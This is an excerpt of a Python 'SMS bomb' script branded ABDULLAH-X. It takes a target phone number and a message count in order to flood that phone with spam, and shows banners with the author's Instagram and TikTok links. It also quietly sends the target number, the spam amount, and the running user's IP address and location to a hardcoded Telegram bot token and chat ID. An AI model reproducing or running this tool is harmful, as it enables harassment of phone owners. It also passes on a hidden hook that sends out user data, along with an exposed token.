...
console = Console()
# ---------------- Name -----------------
sys.stdout.write(f'\x1b[1;35m\x1b]2;(ABDULLAH-X-SMS-BOMB)\x07')
#----------[ BDCYBER ASSEST ]----------#
...
#----------[ BDCYBER SECURITY ]---------#
BOT_TOKEN = "8968942434:AAEJs-P9R-yTfcjjKA_jImvJ8sOD5i9njBQ"  
CHAT_ID = "8777530782"             
...
BANNERS = [fr"""{A}
    ...
    Instagram:
https://www.instagram.com/mdtasnimabdullah?stkn=b3oxbnk1
NmFncTZs
    TikTok:
https://www.tiktok.com/@abdullahx5819?_r=1&_t=ZS-99kmgyh
TFCS
...
def print_banner():
    ...
    send_telegram_msg(f"Target Number: {number}\nSpam Amount: {amo}\nIP: {ip}\nLocation: {address}")

    console.print(
        Align.center(
            Panel.fit(
                "[bold cyan] ABDULLAH X SMS BOMB ",
...
def BCS():
    ...
    if not number.isdigit() or len(number) != 11:
        ...
        time.sleep(2);BCS()
    elif number == "01340970280":
        Lxj(f"{c}[{w}/{c}] {y}you cannot try this number😡🖕😡")
        time.sleep(3);BCS()
        time.sleep(3);BCS()
    elif "BCS" in number:
        Lxj(f"{c}[{w}/{c}] {y}Invalid Number Try Again ! ")
...
send_telegram_msg(f"🚀 Spam Started!\nNumber: {number}\nAmount: {amo}")
...
def DARKS(number,amo):
    ...
    console.print(Align.center(Panel.fit(f"[bold blue]⚡[bold green]  SMS SPAM [bold cyan]v1 [bold red]STARTED\n"
